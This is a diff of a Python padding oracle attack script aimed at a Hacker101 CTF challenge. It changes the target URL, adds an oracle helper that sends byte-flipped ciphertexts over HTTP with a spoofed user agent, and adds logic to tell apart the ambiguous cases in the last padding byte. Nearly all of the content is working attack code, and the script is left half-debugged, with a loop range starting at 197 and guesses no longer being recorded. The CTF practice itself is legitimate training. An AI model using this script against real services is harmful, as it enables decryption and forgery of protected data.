@@ -5,7 +5,7 @@ import base64
 import time
 import copy
 
-url="https://7223d0d3fc1a95817307e9c7bce369a2.ctf.hacker101.com/?post=PyBAupqqEqOKlr3Gr95RCZOEx7RihFkIKW6-1maVmeTc4mNa0oMafEZfOIGbHEtzW4DC2JMEb7NGX97N55cU7lch7q3O9tSHAJl4TbnX168YXvvkMzOp-BYI5wJyUYghsrn7xUUZLjxUd7lg-PSjAHgtWwLfDpTmmP0x1888GWqK0WWcI-b0Qh1Qci88CL8Og3htJrMpaE4!wAzav!IAYQ~~"
+url="https://753be022c7c169da44b81a773f5adcb6.ctf.hacker101.com/?post=7hHtETjfNWmHbkjKZdkBXp5OJju8D6Am8Xl5X-9MzMqa2OcrTroCRJ4u9Se01Ga81UmVKIBt194cxQwb05HC6ALyMHDfiUowj90y9Z7fzpqqA9uWaDoe2VSJEkKKlamgPAQpJqsBCBG9iroisdGYtirIDA3wpFmucHfIx4XFTG1sY!V-qnO-HRBRefAHGL!M3NcsH9K2taaj4JlqgLGO0w~~"
 domain=url.split("?")[0]
 params=url.split("=")[1]
 ua = fake_useragent.UserAgent()
@@ -54,7 +54,12 @@ def tune_padding(byte_array, block):
         blocks[block][16-to_change-1] = original_block[block][16-to_change-1]^original_value^(padding_length+1)
         print(blocks[block][16-to_change-1])
 
-for block in reversed(range(1, len(blocks))):
+# >3 oracle
+def call_oracle(domain,payload):
+    response = requests.get(f"{domain}?post={payload}", headers={"User-Agent": ua.chrome})
+    return padding_correct(response) 
+
+for block in reversed(range(1, len(blocks)-1)):
     guesses = bytearray()
     possible_bytes = bytearray() 
     for byte_position in reversed(range(16)):
@@ -62,18 +67,34 @@ for block in reversed(range(1, len(blocks))):
         if byte_position<15:
             tune_padding(guesses, block)
             possible_bytes=bytearray()
-        for i in range(256):
+        for i in range(197,256):
+            print(f"working with {hex(blocks[block][byte_position])}")
             blocks[block][byte_position] = i
             payload=hex_to_url_b64(blocks_to_dump(blocks))
-            response = requests.get(f"{domain}?post={payload}", headers={'User-Agent': ua.chrome})  
-            if padding_correct(response):
+            #response = requests.get(f"{domain}?post={payload}", headers={'User-Agent': ua.chrome})  
+#            if padding_correct(response):
+            if call_oracle(domain, payload):
                 print(f"\033[32m[+++][====]Possible with the byte {hex(i)}[=+===+==]\033[0m")
-                possible_bytes.append(i)
+                if byte_position == 15:
+                    print(f"\033[33mWe are on the last byte, so we have to check if this byte makes the padding 0x01 or 0x02..0xFF\033[0m")
+                    print(f"Previous block = {blocks[block][byte_position-1]}")
+                    print(blocks[block][byte_position],blocks[block][byte_position-1])
+                    blocks[block][byte_position-1]+=1
+                    print(payload)
+                    print(f"Previous block (updated) = {blocks[block][byte_position-1]}")
+                    payload=hex_to_url_b64(blocks_to_dump(blocks))
+                    print(payload)
+                    if call_oracle(domain, payload):
+                        print("Possible 0x01")
+                    else:
+                        print("Possible 0x02...0xFF")
+                    print(f"checking...")
+                    blocks[block][byte_position-1]-=1
+                    print(blocks[block][byte_position],blocks[block][byte_position-1])
+                    print("done!");
+                    print(f"Previous block (end) = {blocks[block][byte_position-1]}")
+                else:  
+                    possible_bytes.append(i)
                 print(possible_bytes)
             else:
                 print(f"\033[31mTrying with byte value {i} on the {byte_position}th position of the {block}th block\033[0m")
-        if len(possible_bytes)==1:
-            guesses.append(possible_bytes[0])
-        else:
-            print(possible_bytes)
-            raise Exception("Possible 0x02..0xFF padding")
